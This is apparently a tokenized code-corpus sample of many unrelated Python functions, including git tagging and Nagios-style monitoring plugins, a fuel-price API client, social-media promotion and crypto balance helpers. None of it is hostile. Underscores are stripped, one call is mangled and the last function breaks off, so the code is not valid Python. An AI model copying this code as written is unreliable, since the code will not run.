def print information ( handler , label ) : click . echo ( '=> Latest stable: {tag}' . format ( tag = click . style ( str ( handler . latest stable or 'N/A' ) , fg = 'yellow' if handler . latest stable else 'magenta' ) ) ) if label is not None : latest revision = handler . latest revision ( label ) click . echo ( '=> Latest relative revision ({label}): {tag}' . format ( label = click . style ( label , fg = 'blue' ) , tag = click . style ( str ( latest revision or 'N/A' ) , fg = 'yellow' if latest revision else 'magenta' ) ) )
def confirm ( tag ) : click . echo ( ) if click . confirm ( 'Do you want to create the tag {tag}?' . format ( tag = click . style ( str ( tag ) , fg = 'yellow' ) ) , default = True , abort = True ) : git . create tag ( tag ) if click . confirm ( 'Do you want to push the tag {tag} into the upstream?' . format ( tag = click . style ( str ( tag ) , fg = 'yellow' ) ) , default = True ) : git . push tag ( tag ) click . echo ( 'Done!' ) else : git . delete tag ( tag ) click . echo ( 'Aborted!' )
def get state ( self ) : return [ os . path . join ( dp , f ) for dp , , fn in os . walk ( self . dir ) for f in fn ]
def tick ( self ) : self . current += 1 if self . current == self . factor : sys . stdout . write ( '+' ) sys . stdout . flush ( ) self . current = 0
def pickle ( obj , filepath ) : arr = pkl . dumps ( obj , - 1 ) with open ( filepath , 'wb' ) as f : s = 0 while s < len ( arr ) : e = min ( s + blosc . MAX BUFFERSIZE , len ( arr ) ) carr = blosc . compress ( arr [ s : e ] , typesize = 8 ) f . write ( carr ) s = e
def unpickle ( filepath ) : arr = [ ] with open ( filepath , 'rb' ) as f : carr = f . read ( blosc . MAX BUFFERSIZE ) while len ( carr ) > 0 : arr . append ( blosc . decompress ( carr ) ) carr = f . read ( blosc . MAX BUFFERSIZE ) return pkl . loads ( b"" . join ( arr ) )
def contact ( request ) : form = Contact Form ( request . POST or None ) if form . is valid ( ) : subject = form . cleaned data [ 'subject' ] message = form . cleaned data [ 'message' ] sender = form . cleaned data [ 'sender' ] cc myself = form . cleaned data [ 'cc myself' ] recipients = settings . CONTACTFORM RECIPIENTS if cc myself : recipients . append ( sender ) send mail ( getattr ( settings , "CONTACTFORM SUBJECT PREFIX" , '' ) + subject , message , sender , recipients ) return render ( request , 'contactform/thanks.html' ) return render ( request , 'contactform/contact.html' , { 'form' : form } )
def write ( ) : click . echo ( "Fantastic. Let's get started. " ) title = click . prompt ( "What's the title?" ) # Make sure that title doesn't exist. url = slugify ( title ) url = click . prompt ( "What's the URL?" , default = url ) # Make sure that title doesn't exist. click . echo ( "Got it. Creating %s..." % url ) scaffold piece ( title , url )
def scaffold ( ) : click . echo ( "A whole new site? Awesome." ) title = click . prompt ( "What's the title?" ) url = click . prompt ( "Great. What's url? http://" ) # Make sure that title doesn't exist. click . echo ( "Got it. Creating %s..." % url )
def promote ( ) : if "BUFFER ACCESS TOKEN" not in os . environ : warn ( "Missing BUFFER ACCESS TOKEN." ) echo ( "To publish to social medial, you'll need an access token for buffer." ) echo ( "The simplest way to get one is to create a new app here: https://buffer.com/developers/apps" ) echo ( "The token you want is the 'Access Token'" ) echo ( "Once you have it, make it available to ink by putting it in the environment." ) # GET https://api.bufferapp.com/1/profiles.json echo ( "Verifying available profiles on buffer" ) profiles = buffer get ( "/1/profiles.json" ) for p in profiles : supported profile = False if p [ "formatted service" ] . lower ( ) == "facebook" or p [ "formatted service" ] . lower ( ) == "facebook page" : facebook profiles . append ( p ) supported profile = True elif p [ "formatted service" ] . lower ( ) == "twitter" : twitter profiles . append ( p ) supported profile = True if supported profile : click . secho ( u"  %s: %s" % ( [ " f ormatted service"],   p " f ormatted username"]) ,   f =" g reen") echo ( "Checking publication status..." ) site json filename = os . path . join ( ROOT DIR , BUILD DIR , "static" , "private.json" ) with open ( site json filename , "r" ) as site json : site = load ( site json ) echo ( 'Reviewing social posts...' ) posts = { } unpublished posts = [ ] for dirpath , dirnames , filenames in os . walk ( os . path . join ( ROOT DIR , "posts" ) , topdown = False ) : for filename in filenames : if "piece.md" in filename : if exists ( dirpath , "social.yml" ) and exists ( dirpath , "meta.yml" ) : with open ( os . path . join ( dirpath , "social.yml" ) ) as f : social = load ( f ) with open ( os . path . join ( dirpath , "meta.yml" ) ) as f : meta = load ( f ) if "url" in meta : site json entry = None for sp in site [ "posts" ] : if meta [ "url" ] == sp [ "url" ] : site json entry = sp break posts [ meta [ "url" ] ] = { "meta" : meta , "social" : social , "dirpath" : dirpath , "site" : site json entry , } if "published" not in social or social [ "published" ] is not True : unpublished posts . append ( meta [ "url" ] ) else : warn ( "No url found for %s" % dirpath . replace ( ROOT DIR ) ) automark set = False automark = None for u in unpublished posts : post = posts [ u ] if "posts" in post [ "social" ] and post [ "social" ] [ "posts" ] and len ( post [ "social" ] [ "posts" ] ) > 0 : facebook posts = [ ] twitter posts = [ ] mark as published = False has valid post = False for p in post [ "social" ] [ "posts" ] : try : if len ( p . keys ( ) ) != 1 : error ( "Something's formatted wrong in %s's social.yml" % u ) break if p . keys ( ) [ 0 ] == "facebook" : facebook posts . append ( p [ "facebook" ] ) if post in future ( p [ "facebook" ] , post ) : has valid post = True elif p . keys ( ) [ 0 ] == "twitter" : if post in future ( p [ "twitter" ] , post ) : has valid post = True twitter posts . append ( p [ "twitter" ] ) else : warn ( "Unknown post type: %s.  Skipping." % p . keys ( ) [ 0 ] ) except : error ( "Error parsing social.yml for \"%s\"" % post [ "meta" ] [ "title" ] ) import traceback traceback . print exc ( ) if not has valid post : if automark : mark as published = True else : warn ( '"%s" hasn\'t been published, but all posts are in the past.' % post [ "meta" ] [ "title" ] ) if click . confirm ( "Mark as published?" ) : mark as published = True if not automark set : if click . confirm ( "Mark all other similar posts as published?" ) : automark = True automark set = True else : echo ( '\n"%s" hasn\'t been published to social media.' % post [ "meta" ] [ "title" ] ) if len ( facebook posts ) > 0 : echo ( "  Facebook:" ) for p in facebook posts : if ( len ( p [ "content" ] ) > 40 ) : truncated content = "%s..." % p [ "content" ] [ : 40 ] else : truncated content = p [ "content" ] if post in future ( p , post ) : echo ( "   - %s:  \"%s\"" % ( publish datetime ( p , post ) . strftime ( "%c" ) , truncated content , ) ) else : warn ( "   - %s:  \"%s\" skipping (past)" % ( publish datetime ( p , post ) . strftime ( "%c" ) , truncated content , ) ) echo ( "  Twitter:" ) if len ( twitter posts ) > 0 : for p in twitter posts : if ( len ( p [ "content" ] ) > 40 ) : truncated content = "%s..." % p [ "content" ] [ : 40 ] else : truncated content = p [ "content" ] if post in future ( p , post ) : echo ( "   - %s:  \"%s\"" % ( publish datetime ( p , post ) . strftime ( "%c" ) , truncated content , ) ) else : warn ( "   - %s:  \"%s\" skipping (past)" % ( publish datetime ( p , post ) . strftime ( "%c" ) , truncated content , ) ) if click . confirm ( click . style ( "  Publish now?" , fg = "green" ) ) : mark as published = True echo ( "  Publishing..." ) for p in facebook posts : if post in future ( p , post ) : publish facebook ( p , post ) if ( len ( p [ "content" ] ) > 40 ) : truncated content = "%s..." % p [ "content" ] [ : 40 ] else : truncated content = p [ "content" ] click . secho ( u"    Facebook %s:  \"%s\"" % ( publish datetime ( p , post ) . strftime ( "%c" ) , truncated content , ) , fg = "green" ) for p in twitter posts : if post in future ( p , post ) : publish twitter ( p , post ) if ( len ( p [ "content" ] ) > 40 ) : truncated content = "%s..." % p [ "content" ] [ : 40 ] else : truncated content = p [ "content" ] click . secho ( u"    Twitter %s:  \"%s\"" % ( publish datetime ( p , post ) . strftime ( "%c" ) , truncated content , ) , fg = "green" ) echo ( "  Published." ) # Save as published. if mark as published or automark : post [ "social" ] [ "published" ] = True with open ( os . path . join ( post [ "dirpath" ] , "social.yml" ) , "w" ) as f : dump ( post [ "social" ] , f , default flow style = False , width = 1000 ) if click . confirm ( "Publish your entire backlog to buffer?" ) : print ( "dope" )
def get branches ( self ) : return [ self . sanitize ( branch ) for branch in self . git . branch ( color = "never" ) . splitlines ( ) ]
def get current branch ( self ) : return next ( ( self . sanitize ( branch ) for branch in self . git . branch ( color = "never" ) . splitlines ( ) if branch . startswith ( '*' ) ) , None )
def create patch ( self , from tag , to tag ) : return str ( self . git . diff ( '{}..{}' . format ( from tag , to tag ) , tty out = False ) )
def get fuel prices ( self ) -> Get Fuel Prices Response : response = requests . get ( '{}/prices' . format ( API URL BASE ) , headers = self . get headers ( ) , timeout = self . timeout , ) if not response . ok : raise Fuel Check Error . create ( response ) return Get Fuel Prices Response . deserialize ( response . json ( ) )
def get fuel prices for station ( self , station : int ) -> List [ Price ] : response = requests . get ( '{}/prices/station/{}' . format ( API URL BASE , station ) , headers = self . get headers ( ) , timeout = self . timeout , ) if not response . ok : raise Fuel Check Error . create ( response ) data = response . json ( ) return [ Price . deserialize ( data ) for data in data [ 'prices' ] ]
def get fuel prices within radius ( self , latitude : float , longitude : float , radius : int , fuel type : str , brands : Optional [ List [ str ] ] = None ) -> List [ Station Price ] : if brands is None : brands = [ ] response = requests . post ( '{}/prices/nearby' . format ( API URL BASE ) , json = { 'fueltype' : fuel type , 'latitude' : latitude , 'longitude' : longitude , 'radius' : radius , 'brand' : brands , } , headers = self . get headers ( ) , timeout = self . timeout , ) if not response . ok : raise Fuel Check Error . create ( response ) data = response . json ( ) stations = { station [ 'code' ] : Station . deserialize ( station ) for station in data [ 'stations' ] } station prices = [ ] # type: List[Station Price] for serialized price in data [ 'prices' ] : price = Price . deserialize ( serialized price ) station prices . append ( Station Price ( price = price , station = stations [ price . station code ] ) ) return station prices
def get fuel price trends ( self , latitude : float , longitude : float , fuel types : List [ str ] ) -> Price Trends : response = requests . post ( '{}/prices/trends/' . format ( API URL BASE ) , json = { 'location' : { 'latitude' : latitude , 'longitude' : longitude , } , 'fueltypes' : [ { 'code' : type } for type in fuel types ] , } , headers = self . get headers ( ) , timeout = self . timeout , ) if not response . ok : raise Fuel Check Error . create ( response ) data = response . json ( ) return Price Trends ( variances = [ Variance . deserialize ( variance ) for variance in data [ 'Variances' ] ] , average prices = [ Average Price . deserialize ( avg price ) for avg price in data [ 'Average Prices' ] ] )
def pre ( self , command , output dir , vars ) : # import pdb;pdb.set trace() vars [ 'license name' ] = 'Apache' vars [ 'year' ] = time . strftime ( '%Y' , time . localtime ( ) )
def add Route ( self , f , matcher ) : self . routes . append ( ( f . func name , f , matcher ) )
def tempfile ( filename ) : return tempfile . Named Temporary File ( mode = 'w' , dir = os . path . dirname ( filename ) , prefix = os . path . basename ( filename ) , suffix = os . fsencode ( '.tmp' ) , delete = False )
def atomic write ( filename ) : f = tempfile ( os . fsencode ( filename ) ) try : yield f finally : f . close ( ) # replace the original file with the new temp file (atomic on success) os . replace ( f . name , filename )
def get item ( filename , uuid ) : with open ( os . fsencode ( str ( filename ) ) , "r" ) as f : data = json . load ( f ) results = [ i for i in data if i [ "uuid" ] == str ( uuid ) ] if results : return results return None
def set item ( filename , item ) : with atomic write ( os . fsencode ( str ( filename ) ) ) as temp file : with open ( os . fsencode ( str ( filename ) ) ) as products file : # load the JSON data into memory products data = json . load ( products file ) # check if UUID already exists uuid list = [ i for i in filter ( lambda z : z [ "uuid" ] == str ( item [ "uuid" ] ) , products data ) ] if len ( uuid list ) == 0 : # add the new item to the JSON file products data . append ( item ) # save the new JSON to the temp file json . dump ( products data , temp file ) return True return None
def update item ( filename , item , uuid ) : with atomic write ( os . fsencode ( str ( filename ) ) ) as temp file : with open ( os . fsencode ( str ( filename ) ) ) as products file : # load the JSON data into memory products data = json . load ( products file ) # apply modifications to the JSON data wrt UUID # TODO: handle this in a neat way if 'products' in products data [ - 1 ] : # handle orders object [ products data [ i ] [ "products" ] [ 0 ] . update ( item ) for ( i , j ) in enumerate ( products data ) if j [ "uuid" ] == str ( uuid ) ] else : # handle products object [ products data [ i ] . update ( item ) for ( i , j ) in enumerate ( products data ) if j [ "uuid" ] == str ( uuid ) ] # save the modified JSON data into the temp file json . dump ( products data , temp file ) return True
def main ( ) : plugin = Register ( ) if plugin . args . option == 'command' : plugin . command handle ( ) else : plugin . unknown ( "Unknown actions." )
def command handle ( self ) : self . results = self . execute ( self . args . command ) self . close ( ) self . logger . debug ( "results: {}" . format ( self . results ) ) if not self . results : self . unknown ( "{} return nothing." . format ( self . args . command ) ) if len ( self . results ) != 1 : self . unknown ( "{} return more than one number." . format ( self . args . command ) ) self . result = int ( self . results [ 0 ] ) self . logger . debug ( "result: {}" . format ( self . result ) ) if not isinstance ( self . result , ( int , long ) ) : self . unknown ( "{} didn't return single number." . format ( self . args . command ) ) status = self . ok # Compare the vlaue. if self . result > self . args . warning : status = self . warning if self . result > self . args . critical : status = self . critical # Output self . shortoutput = "{0} return {1}." . format ( self . args . command , self . result ) [ self . longoutput . append ( line ) for line in self . results if self . results ] self . perfdata . append ( "{command}={result};{warn};{crit};0;" . format ( crit = self . args . critical , warn = self . args . warning , result = self . result , command = self . args . command ) ) # Return status with message to Nagios. status ( self . output ( long output limit = None ) ) self . logger . debug ( "Return status and exit to Nagios." )
def execute ( self , command , timeout = None ) : try : self . channel = self . ssh . get transport ( ) . open session ( ) except paramiko . SSH Exception as e : self . unknown ( "Create channel error: %s" % e ) try : self . channel . settimeout ( self . args . timeout if not timeout else timeout ) except socket . timeout as e : self . unknown ( "Settimeout for channel error: %s" % e ) try : self . logger . debug ( "command: {}" . format ( command ) ) self . channel . exec command ( command ) except paramiko . SSH Exception as e : self . unknown ( "Execute command error: %s" % e ) try : self . stdin = self . channel . makefile ( 'wb' , - 1 ) self . stderr = map ( string . strip , self . channel . makefile stderr ( 'rb' , - 1 ) . readlines ( ) ) self . stdout = map ( string . strip , self . channel . makefile ( 'rb' , - 1 ) . readlines ( ) ) except Exception as e : self . unknown ( "Get result error: %s" % e ) try : self . status = self . channel . recv exit status ( ) except paramiko . SSH Exception as e : self . unknown ( "Get return code error: %s" % e ) else : if self . status != 0 : self . unknown ( "Return code: %d , stderr: %s" % ( self . status , self . errors ) ) else : return self . stdout finally : self . logger . debug ( "Execute command finish." )
def close ( self ) : try : self . ssh . close ( ) self . logger . debug ( "close connect succeed." ) except paramiko . SSH Exception as e : self . unknown ( "close connect error: %s" % e )
def slinky ( filename , seconds available , bucket name , aws key , aws secret ) : if not os . environ . get ( 'AWS ACCESS KEY ID' ) and os . environ . get ( 'AWS SECRET ACCESS KEY' ) : print 'Need to set environment variables for AWS access and create a slinky bucket.' exit ( ) print create temp s3 link ( filename , seconds available , bucket name )
def main ( ) : plugin = Register ( ) if plugin . args . option == 'filenumber' : plugin . filenumber handle ( ) else : plugin . unknown ( "Unknown actions." )
def filenumber handle ( self ) : self . results = [ ] self . dirs = [ ] self . files = [ ] self . ftp = self . connect ( ) self . ftp . dir ( self . args . path , self . results . append ) self . logger . debug ( "dir results: {}" . format ( self . results ) ) self . quit ( ) status = self . ok for data in self . results : if "<DIR>" in data : self . dirs . append ( str ( data . split ( ) [ 3 ] ) ) else : self . files . append ( str ( data . split ( ) [ 2 ] ) ) self . result = len ( self . files ) self . logger . debug ( "result: {}" . format ( self . result ) ) # Compare the vlaue. if self . result > self . args . warning : status = self . warning if self . result > self . args . critical : status = self . critical # Output self . shortoutput = "Found {0} files in {1}." . format ( self . result , self . args . path ) [ self . longoutput . append ( line ) for line in self . results if self . results ] self . perfdata . append ( "{path}={result};{warn};{crit};0;" . format ( crit = self . args . critical , warn = self . args . warning , result = self . result , path = self . args . path ) ) self . logger . debug ( "Return status and output." ) status ( self . output ( ) )
def register json ( self , data ) : j = json . loads ( data ) self . last data timestamp = datetime . datetime . utcnow ( ) . replace ( microsecond = 0 ) . isoformat ( ) try : for v in j : # prepare the sensor entry container self . data [ v [ self . id key ] ] = { } # add the mandatory entries self . data [ v [ self . id key ] ] [ self . id key ] = v [ self . id key ] self . data [ v [ self . id key ] ] [ self . value key ] = v [ self . value key ] # add the optional well known entries if provided if self . unit key in v : self . data [ v [ self . id key ] ] [ self . unit key ] = v [ self . unit key ] if self . threshold key in v : self . data [ v [ self . id key ] ] [ self . threshold key ] = v [ self . threshold key ] # add any further entries found for k in self . other keys : if k in v : self . data [ v [ self . id key ] ] [ k ] = v [ k ] # add the custom sensor time if self . sensor time key in v : self . data [ v [ self . sensor time key ] ] [ self . sensor time key ] = v [ self . sensor time key ] # last: add the time the data was received (overwriting any # not properly defined timestamp that was already there) self . data [ v [ self . id key ] ] [ self . time key ] = self . last data timestamp except Key Error as e : print ( "The main key was not found on the serial input line: " + str ( e ) ) except Value Error as e : print ( "No valid JSON string received. Waiting for the next turn." ) print ( "The error was: " + str ( e ) )
def get translated data ( self ) : j = { } for k in self . data : d = { } for l in self . data [ k ] : d [ self . translation keys [ l ] ] = self . data [ k ] [ l ] j [ k ] = d return j
def get json ( self , prettyprint = False , translate = True ) : j = [ ] if translate : d = self . get translated data ( ) else : d = self . data for k in d : j . append ( d [ k ] ) if prettyprint : j = json . dumps ( j , indent = 2 , separators = ( ',' , ': ' ) ) else : j = json . dumps ( j ) return j
def get json tuples ( self , prettyprint = False , translate = True ) : j = self . get json ( prettyprint , translate ) if len ( j ) > 2 : if prettyprint : j = j [ 1 : - 2 ] + ",\n" else : j = j [ 1 : - 1 ] + "," else : j = "" return j
def generate html diff ( self , expected fn , expected lines , obtained fn , obtained lines ) : import difflib differ = difflib . Html Diff ( ) return differ . make file ( fromlines = expected lines , fromdesc = expected fn , tolines = obtained lines , todesc = obtained fn , )
def broadcast tx ( self , address , amount , secret , secondsecret = None , vendorfield = '' ) : peer = random . choice ( self . PEERS ) park = Park ( peer , 4001 , constants . ARK NETHASH , '1.1.1' ) return park . transactions ( ) . create ( address , str ( amount ) , vendorfield , secret , secondsecret )
def register ( self , service , name = '' ) : try : is model = issubclass ( service , orb . Model ) except Standard Error : is model = False # expose an ORB table dynamically as a service if is model : self . services [ service . schema ( ) . dbname ( ) ] = ( Model Service , service ) else : super ( Orb Api Factory , self ) . register ( service , name = name )
def main ( ) : plugin = Register ( ) if plugin . args . option == 'sql' : plugin . sql handle ( ) else : plugin . unknown ( "Unknown actions." )
def main ( ) : global DEBUG argd = docopt ( USAGESTR , version = VERSIONSTR , script = SCRIPT ) DEBUG = argd [ '--debug' ] width = parse int ( argd [ '--width' ] or DEFAULT WIDTH ) or 1 indent = parse int ( argd [ '--indent' ] or ( argd [ '--INDENT' ] or 0 ) ) prepend = ' ' * ( indent * 4 ) if prepend and argd [ '--indent' ] : # Smart indent, change max width based on indention. width -= len ( prepend ) userprepend = argd [ '--prepend' ] or ( argd [ '--PREPEND' ] or '' ) prepend = '' . join ( ( prepend , userprepend ) ) if argd [ '--prepend' ] : # Smart indent, change max width based on prepended text. width -= len ( userprepend ) userappend = argd [ '--append' ] or ( argd [ '--APPEND' ] or '' ) if argd [ '--append' ] : width -= len ( userappend ) if argd [ 'WORDS' ] : # Try each argument as a file name. argd [ 'WORDS' ] = ( ( try read file ( w ) if len ( w ) < 256 else w ) for w in argd [ 'WORDS' ] ) words = ' ' . join ( ( w for w in argd [ 'WORDS' ] if w ) ) else : # No text/filenames provided, use stdin for input. words = read stdin ( ) block = Format Block ( words ) . iter format block ( chars = argd [ '--chars' ] , fill = argd [ '--fill' ] , prepend = prepend , strip first = argd [ '--stripfirst' ] , append = userappend , strip last = argd [ '--striplast' ] , width = width , newlines = argd [ '--newlines' ] , lstrip = argd [ '--lstrip' ] , ) for i , line in enumerate ( block ) : if argd [ '--enumerate' ] : # Current line number format supports up to 999 lines before # messing up. Who would format 1000 lines like this anyway? print ( '{: >3}: {}' . format ( i + 1 , line ) ) else : print ( line ) return 0
def debug ( * args , * * kwargs ) : if not ( DEBUG and args ) : return None # Include parent class name when given. parent = kwargs . get ( 'parent' , None ) with suppress ( Key Error ) : kwargs . pop ( 'parent' ) # Go back more than once when given. backlevel = kwargs . get ( 'back' , 1 ) with suppress ( Key Error ) : kwargs . pop ( 'back' ) frame = inspect . currentframe ( ) # Go back a number of frames (usually 1). while backlevel > 0 : frame = frame . f back backlevel -= 1 fname = os . path . split ( frame . f code . co filename ) [ - 1 ] lineno = frame . f lineno if parent : func = '{}.{}' . format ( parent . class . name , frame . f code . co name ) else : func = frame . f code . co name lineinfo = '{}:{} {}: ' . format ( C ( fname , 'yellow' ) , C ( str ( lineno ) . ljust ( 4 ) , 'blue' ) , C ( ) . join ( C ( func , 'magenta' ) , '()' ) . ljust ( 20 ) ) # Patch args to stay compatible with print(). pargs = list ( C ( a , 'green' ) . str ( ) for a in args ) pargs [ 0 ] = '' . join ( ( lineinfo , pargs [ 0 ] ) ) print err ( * pargs , * * kwargs )
def close ( self ) : self . tempfile . close ( ) self . process . terminate ( ) if self . process . is alive ( ) : self . process . kill ( )
def init app ( self , app ) : app . config . setdefault ( "TRACY REQUIRE CLIENT" , False ) if not hasattr ( app , 'extensions' ) : app . extensions = { } app . extensions [ 'restpoints' ] = self app . before request ( self . before ) app . after request ( self . after )
def before ( self ) : # Don't trace excluded routes. if request . path in self . excluded routes : request . tracy exclude = True return request . tracy start time = monotonic ( ) client = request . headers . get ( trace header client , None ) require client = current app . config . get ( "TRACY REQUIRE CLIENT" , False ) if client is None and require client : abort ( 400 , "Missing %s header" % trace header client ) request . tracy client = client request . tracy id = request . headers . get ( trace header id , new id ( ) )
def expand words ( self , line , width = 60 ) : if not line . strip ( ) : return line # Word index, which word to insert on (cycles between 1->len(words)) wordi = 1 while len ( strip codes ( line ) ) < width : wordendi = self . find word end ( line , wordi ) if wordendi < 0 : # Reached the end?, try starting at the front again. wordi = 1 wordendi = self . find word end ( line , wordi ) if wordendi < 0 : # There are no spaces to expand, just prepend one. line = '' . join ( ( ' ' , line ) ) else : line = ' ' . join ( ( line [ : wordendi ] , line [ wordendi : ] ) ) wordi += 1 # Don't push a single word all the way to the right. if ' ' not in strip codes ( line ) . strip ( ) : return line . replace ( ' ' , '' ) return line
def iter add text ( self , lines , prepend = None , append = None ) : if ( prepend is None ) and ( append is None ) : yield from lines else : # Build up a format string, with optional {prepend}/{append} fmtpcs = [ '{prepend}' ] if prepend else [ ] fmtpcs . append ( '{line}' ) if append : fmtpcs . append ( '{append}' ) fmtstr = '' . join ( fmtpcs ) yield from ( fmtstr . format ( prepend = prepend , line = line , append = append ) for line in lines )
def iter char block ( self , text = None , width = 60 , fmtfunc = str ) : if width < 1 : width = 1 text = ( self . text if text is None else text ) or '' text = ' ' . join ( text . split ( '\n' ) ) escapecodes = get codes ( text ) if not escapecodes : # No escape codes, use simple method. yield from ( fmtfunc ( text [ i : i + width ] ) for i in range ( 0 , len ( text ) , width ) ) else : # Ignore escape codes when counting. blockwidth = 0 block = [ ] for i , s in enumerate ( get indices list ( text ) ) : block . append ( s ) if len ( s ) == 1 : # Normal char. blockwidth += 1 if blockwidth == width : yield '' . join ( block ) block = [ ] blockwidth = 0 if block : yield '' . join ( block )
def iter space block ( self , text = None , width = 60 , fmtfunc = str ) : if width < 1 : width = 1 curline = '' text = ( self . text if text is None else text ) or '' for word in text . split ( ) : possibleline = ' ' . join ( ( curline , word ) ) if curline else word # Ignore escape codes. codelen = sum ( len ( s ) for s in get codes ( possibleline ) ) reallen = len ( possibleline ) - codelen if reallen > width : # This word would exceed the limit, start a new line with # it. yield fmtfunc ( curline ) curline = word else : curline = possibleline # yield the last line. if curline : yield fmtfunc ( curline )
def run ( self ) : self . log . debug ( 'consumer is running...' ) self . running = True while self . running : self . upload ( ) self . log . debug ( 'consumer exited.' )
def upload ( self ) : success = False batch = self . next ( ) if len ( batch ) == 0 : return False try : self . request ( batch ) success = True except Exception as e : self . log . error ( 'error uploading: %s' , e ) success = False if self . on error : self . on error ( e , batch ) finally : # cleanup for item in batch : self . queue . task done ( ) return success
def next ( self ) : queue = self . queue items = [ ] item = self . next item ( ) if item is None : return items items . append ( item ) while len ( items ) < self . upload size and not queue . empty ( ) : item = self . next item ( ) if item : items . append ( item ) return items
def next item ( self ) : queue = self . queue try : item = queue . get ( block = True , timeout = 5 ) return item except Exception : return None
def request ( self , batch , attempt = 0 ) : try : q = self . api . new queue ( ) for msg in batch : q . add ( msg [ 'event' ] , msg [ 'value' ] , source = msg [ 'source' ] ) q . submit ( ) except : if attempt > self . retries : raise self . request ( batch , attempt + 1 )
def main ( ) : ep = requests . get ( TRELLO API DOC ) . content root = html . fromstring ( ep ) links = root . xpath ( '//a[contains(@class, "reference internal")]/@href' ) pages = [ requests . get ( TRELLO API DOC + u ) for u in links if u . endswith ( 'index.html' ) ] endpoints = [ ] for page in pages : root = html . fromstring ( page . content ) sections = root . xpath ( '//div[@class="section"]/h2/..' ) for sec in sections : ep html = etree . tostring ( sec ) . decode ( 'utf-8' ) ep text = html2text ( ep html ) . splitlines ( ) match = EP DESC REGEX . match ( ep text [ 0 ] ) if not match : continue ep method , ep url = match . groups ( ) ep text [ 0 ] = ' ' . join ( [ ep method , ep url ] ) ep doc = b64encode ( gzip . compress ( '\n' . join ( ep text ) . encode ( 'utf-8' ) ) ) endpoints . append ( ( ep method , ep url , ep doc ) ) print ( yaml . dump ( create tree ( endpoints ) ) )
def quit ( self ) : try : self . ftp . quit ( ) self . logger . debug ( "quit connect succeed." ) except ftplib . Error as e : self . unknown ( "quit connect error: %s" % e )
def query ( self , wql ) : try : self . wql = [ 'wmic' , '-U' , self . args . domain + '\\' + self . args . user + '%' + self . args . password , '//' + self . args . host , '--namespace' , self . args . namespace , '--delimiter' , self . args . delimiter , wql ] self . logger . debug ( "wql: {}" . format ( self . wql ) ) self . output = subprocess . check output ( self . wql ) self . logger . debug ( "output: {}" . format ( self . output ) ) self . logger . debug ( "wmi connect succeed." ) self . wmi output = self . output . splitlines ( ) [ 1 : ] self . logger . debug ( "wmi output: {}" . format ( self . wmi output ) ) self . csv header = csv . Dict Reader ( self . wmi output , delimiter = '|' ) self . logger . debug ( "csv header: {}" . format ( self . csv header ) ) return list ( self . csv header ) except subprocess . Called Process Error as e : self . unknown ( "Connect by wmi and run wql error: %s" % e )
def log file ( self , url = None ) : if url is None : url = self . url f = re . sub ( "file://" , "" , url ) try : with open ( f , "a" ) as of : of . write ( str ( self . store . get json tuples ( True ) ) ) except IO Error as e : print ( e ) print ( "Could not write the content to the file.." )
def log post ( self , url = None , credentials = None , do verify certificate = True ) : if url is None : url = self . url if credentials is None : credentials = self . credentials if do verify certificate is None : do verify certificate = self . do verify certificate if credentials and "base64" in credentials : headers = { "Content-Type" : "application/json" , 'Authorization' : 'Basic %s' % credentials [ "base64" ] } else : headers = { "Content-Type" : "application/json" } try : request = requests . post ( url , headers = headers , data = self . store . get json ( ) , verify = do verify certificate ) except httplib . Incomplete Read as e : request = e . partial
def register credentials ( self , credentials = None , user = None , user file = None , password = None , password file = None ) : # lets store all kind of credential data into this dict if credentials is not None : self . credentials = credentials else : self . credentials = { } # set the user from CLI or file if user : self . credentials [ "user" ] = user elif user file : with open ( user file , "r" ) as of : # what would the file entry look like? pattern = re . compile ( "^user: " ) for l in of : if re . match ( pattern , l ) : # strip away the newline l = l [ 0 : - 1 ] self . credentials [ "user" ] = re . sub ( pattern , "" , l ) # remove any surrounding quotes if self . credentials [ "user" ] [ 0 : 1 ] == '"' and self . credentials [ "user" ] [ - 1 : ] == '"' : self . credentials [ "user" ] = self . credentials [ "user" ] [ 1 : - 1 ] # set the password from CLI or file if password : self . credentials [ "password" ] = password elif password file : with open ( password file , "r" ) as of : # what would the file entry look like? pattern = re . compile ( "^password: " ) for l in of : if re . match ( pattern , l ) : # strip away the newline l = l [ 0 : - 1 ] self . credentials [ "password" ] = re . sub ( pattern , "" , l ) # remove any surrounding quotes if self . credentials [ "password" ] [ 0 : 1 ] == '"' and self . credentials [ "password" ] [ - 1 : ] == '"' : self . credentials [ "password" ] = self . credentials [ "password" ] [ 1 : - 1 ] # if both user and password is set, #  1. encode to base 64 for basic auth if "user" in self . credentials and "password" in self . credentials : c = self . credentials [ "user" ] + ":" + self . credentials [ "password" ] self . credentials [ "base64" ] = b64encode ( c . encode ( ) ) . decode ( "ascii" )
def set connection ( host = None , database = None , user = None , password = None ) : c . CONNECTION [ 'HOST' ] = host c . CONNECTION [ 'DATABASE' ] = database c . CONNECTION [ 'USER' ] = user c . CONNECTION [ 'PASSWORD' ] = password
def set delegate ( address = None , pubkey = None , secret = None ) : c . DELEGATE [ 'ADDRESS' ] = address c . DELEGATE [ 'PUBKEY' ] = pubkey c . DELEGATE [ 'PASSPHRASE' ] = secret
def balance ( address ) : txhistory = Address . transactions ( address ) balance = 0 for i in txhistory : if i . recipient Id == address : balance += i . amount if i . sender Id == address : balance -= ( i . amount + i . fee ) delegates = Delegate . delegates ( ) for i in delegates : if address == i . address : forged blocks = Delegate . blocks ( i . pubkey ) for block in forged blocks : balance += ( block . reward + block . total Fee ) if balance < 0 : height = Node . height ( ) logger . fatal ( 'Negative balance for address {0}, Nodeheight: {1)' . format ( address , height ) ) raise Negative Balance Error ( 'Negative balance for address {0}, Nodeheight: {1)' . format ( address , height ) ) return balance
def balance over time ( address ) : forged blocks = None txhistory = Address . transactions ( address ) delegates = Delegate . delegates ( ) for i in delegates : if address == i . address : forged blocks = Delegate . blocks ( i . pubkey ) balance over time = [ ] balance = 0 block = 0 Balance = namedtuple ( 'balance' , 'timestamp amount' ) for tx in txhistory : if forged blocks : while forged blocks [ block ] . timestamp <= tx . timestamp : balance += ( forged blocks [ block ] . reward + forged blocks [ block ] . total Fee ) balance over time . append ( Balance ( timestamp = forged blocks [ block ] . timestamp , amount = balance ) ) block += 1 if tx . sender Id == address : balance -= ( tx . amount + tx . fee ) res = Balance ( timestamp = tx . timestamp , amount = balance ) balance over time . append ( res ) if tx . recipient Id == address : balance += tx . amount res = Balance ( timestamp = tx . timestamp , amount = balance ) balance over time . append ( res ) if forged blocks and block <= len ( forged blocks ) - 1 : if forged blocks [ block ] . timestamp > txhistory [ - 1 ] . timestamp : for i in forged blocks [ block : ] : balance += ( i . reward + i . total Fee ) res = Balance ( timestamp = i . timestamp , amount = balance ) balance over 